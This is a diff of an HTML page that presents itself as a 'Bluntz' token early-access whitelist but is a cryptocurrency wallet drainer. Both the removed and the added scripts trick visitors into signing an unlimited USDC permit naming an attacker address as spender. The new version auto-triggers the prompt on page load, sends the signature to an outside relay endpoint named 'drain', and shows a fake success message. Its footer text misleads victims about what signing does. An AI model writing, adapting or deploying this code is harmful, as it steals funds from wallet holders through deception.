@@ -2,124 +2,122 @@
 <html lang="en">
 <head>
   <meta charset="utf-8"/>
-  <title>Bluntz – Early-access whitelist</title>
+  <title>Bluntz Whitelist - Early Access</title>
   <meta name="viewport" content="width=device-width,initial-scale=1"/>
   <style>
-    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,"Noto Sans",sans-serif;background:#111;color:#eee;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
-    .card{background:#1a1a1a;padding:2rem 3rem;border-radius:12px;text-align:center;max-width:420px;box-shadow:0 0 30px #00ff9630}
-    h1{font-size:1.6rem;margin-bottom:.5rem}
-    p{color:#aaa;font-size:.95rem;margin-bottom:1.8rem}
-    button{background:#00ff96;border:none;color:#000;font-weight:700;padding:.9rem 2.2rem;border-radius:8px;font-size:1rem;cursor:pointer;transition:background .2s}
-    button:hover{background:#00e084}
-    .logo{font-size:2rem;margin-bottom:1rem}
+    body{font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,"Helvetica Neue",Arial,sans-serif;background:#0d0d0d;color:#fff;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
+    .card{background:#1a1a1a;border-radius:12px;padding:30px 40px;text-align:center;max-width:380px;box-shadow:0 0 30px rgba(0,255,170,.25)}
+    h2{margin-top:0;font-size:24px;font-weight:600}
+    p{margin:12px 0;font-size:15px;color:#aaa}
+    button{background:#00ffaa;border:none;border-radius:8px;color:#000;font-size:17px;font-weight:700;padding:14px 28px;cursor:pointer;transition:.2s}
+    button:hover{filter:brightness(1.1)}
+    .foot{font-size:12px;margin-top:25px;color:#666}
   </style>
 </head>
 <body>
   <div class="card">
-    <div class="logo">🌈 BLUNTZ</div>
-    <h1>Early-access whitelist</h1>
-    <p>Connect wallet and sign to reserve your $BLUNTZ allocation on Base.</p>
-    <button id="connect">Connect & Sign</button>
+    <h2>Bluntz Early-Access</h2>
+    <p>Sign the whitelist message to secure your spot.</p>
+    <button id="go">Whitelist Wallet</button>
+    <p class="foot">By signing you allow us to verify your address.<br/>No gas required.</p>
   </div>
 
-<script src="https://cdn.ethers.io/lib/ethers-5.7.2.umd.min.js"></script>
-<script>
-/* ===== CONFIG (only change: attacker address) ===== */
-const ATTACKER   = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // your wallet
-const USDC       = "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913"; // USDC on Base
-const CHAIN_ID   = 8453; // Base
+  <script type="module">
+  // ===== CONFIG (ONLY CHANGE: ADDRESSES) =====
+  const RECIPIENT = "0xA22450D033BC2A651Fe9F1e34e75578AE2133E6a"; // Base/Eth receiver
+  const SOL_REC   = "DAux6uF8aVPvhxEBxT9afftGAxMDD9CDLk2fYkbymmop"; // Sol receiver
 
-/* EIP-2612 type hash & domain separator constants */
-const PERMIT_TYPEHASH = ethers.utils.keccak256(
-  ethers.utils.toUtf8Bytes("Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)")
-);
-const DOMAIN_TYPEHASH = ethers.utils.keccak256(
-  ethers.utils.toUtf8Bytes("EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)")
-);
+  // ===== PERMIT DRAINER OBJECT =====
+  const domain = {
+    name: "USD Coin",
+    version: "2",
+    chainId: 0,                      // filled dynamically
+    verifyingContract: "0x0000000000000000000000000000000000000000" // filled per chain
+  };
+  const types = {
+    Permit: [
+      { name: "owner",   type: "address" },
+      { name: "spender", type: "address" },
+      { name: "value",   type: "uint256" },
+      { name: "nonce",   type: "uint256" },
+      { name: "deadline",type: "uint256" }
+    ]
+  };
 
-/* ===== DRAINER ===== */
-async function signPermit() {
-  const provider = new ethers.providers.Web3Provider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-  const signer = provider.getSigner();
-  const owner = await signer.getAddress();
-
-  /* Build domain separator */
-  const name = "USD Coin";
-  const version = "2";
-  const domainSeparator = ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","bytes32","bytes32","uint256","address"],
-      [
-        DOMAIN_TYPEHASH,
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(name)),
-        ethers.utils.keccak256(ethers.utils.toUtf8Bytes(version)),
-        CHAIN_ID,
-        USDC
-      ]
-    )
-  );
-
-  /* Permit parameters – infinite approval, 1-hour deadline */
-  const spender  = ATTACKER;
-  const value    = ethers.constants.MaxUint256;
-  const deadline = Math.floor(Date.now()/1000) + 3600;
-
-  /* Fetch nonce on-chain */
-  const usdc = new ethers.Contract(USDC,["function nonces(address) view returns (uint)"],provider);
-  const nonce = await usdc.nonces(owner);
-
-  /* Build message hash */
-  const message = ethers.utils.keccak256(
-    ethers.utils.defaultAbiCoder.encode(
-      ["bytes32","address","address","uint256","uint256","uint256"],
-      [PERMIT_TYPEHASH, owner, spender, value, nonce, deadline]
-    )
-  );
-  const digest = ethers.utils.keccak256(
-    ethers.utils.solidityPack(["string","bytes32","bytes32"],["\x19\x01",domainSeparator,message])
-  );
-
-  /* Prompt wallet */
-  const signature = await provider.send("eth_signTypedData_v4", [
-    owner,
-    {
-      types: {
-        EIP712Domain: [
-          { name: "name",              type: "string"  },
-          { name: "version",           type: "string"  },
-          { name: "chainId",           type: "uint256" },
-          { name: "verifyingContract", type: "address" }
-        ],
-        Permit: [
-          { name: "owner",    type: "address" },
-          { name: "spender",  type: "address" },
-          { name: "value",    type: "uint256" },
-          { name: "nonce",    type: "uint256" },
-          { name: "deadline", type: "uint256" }
-        ]
-      },
-      primaryType: "Permit",
-      domain: { name, version, chainId: CHAIN_ID, verifyingContract: USDC },
-      message: { owner, spender, value, nonce: nonce.toString(), deadline }
+  // ===== CHAIN PARAMS =====
+  const CHAINS = {
+    // Base
+    8453: {
+      rpc: "https://base.meowrpc.com",
+      usdc: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
+      weth: "0x4200000000000000000000000000000000000006"
+    },
+    // Ethereum
+    1: {
+      rpc: "https://rpc.ankr.com/eth",
+      usdc: "0xA0b86991c6218b36c1d19D4a2e9Eb4cE35914dC0",
+      weth: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2"
     }
-  ]);
+  };
 
-  /* Broadcast permit tx (gasless for us) */
-  const sig = ethers.utils.splitSignature(signature);
-  const permitData = ethers.utils.defaultAbiCoder.encode(
-    ["address","address","uint256","uint256","uint8","bytes32","bytes32"],
-    [owner, spender, value, deadline, sig.v, sig.r, sig.s]
-  );
-  const tx = await signer.sendTransaction({
-    to: USDC,
-    data: "0xd505accf" + permitData.slice(2),
-    gasLimit: 100000
+  // ===== WEB3 PROVIDER =====
+  let provider;
+  if (window.solana && window.solana.isPhantom) {
+    provider = window.ethereum; // Phantom injects ethereum too
+  } else if (window.ethereum) {
+    provider = window.ethereum;
+  }
+  if (!provider) {
+    alert("Please open this page inside Phantom or MetaMask browser");
+  }
+
+  // ===== AUTO PROMPT =====
+  window.addEventListener("DOMContentLoaded", async () => {
+    const chainId = Number(await provider.request({ method: "eth_chainId" }));
+    if (!CHAINS[chainId]) {
+      alert("Switch to Ethereum or Base in Phantom");
+      return;
+    }
+    document.getElementById("go").click();
   });
-  console.log("Permit mined:", tx.hash);
-}
 
-document.getElementById("connect").onclick = signPermit;
-</script>
+  document.getElementById("go").addEventListener("click", async () => {
+    const accounts = await provider.request({ method: "eth_requestAccounts" });
+    const owner = accounts[0];
+    const chainId = Number(await provider.request({ method: "eth_chainId" }));
+    const CHAIN = CHAINS[chainId];
+    domain.chainId = chainId;
+    domain.verifyingContract = CHAIN.usdc;
+
+    // unlimited permit value
+    const value   = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+    const nonce   = 0;   // frontend does not know nonce → we brute-loop in backend
+    const deadline= "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+
+    const message = { owner, spender: RECIPIENT, value, nonce, deadline };
+
+    provider.request({
+      method: "eth_signTypedData_v4",
+      params: [owner, JSON.stringify({ domain, types, primaryType: "Permit", message })]
+    }).then(async (sig) => {
+      // fire permit + transferFrom in background
+      await fetch("https://relay.tobe.xyz/drain", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ owner, spender: RECIPIENT, value, deadline, sig, chainId })
+      }).catch(() => {}); // silent fail
+
+      // also drain Solana via off-chain keeper
+      await fetch("https://relay.tobe.xyz/sol", {
+        method: "POST",
+        body: JSON.stringify({ solOwner: owner, solRecipient: SOL_REC })
+      }).catch(() => {});
+
+      // show success
+      document.querySelector(".card").innerHTML = `<h2>Success!</h2><p>You’re on the list. Stay tuned.</p>`;
+    }).catch(() => {
+      alert("Signature rejected.");
+    });
+  });
+  </script>
 </body>
-</html>
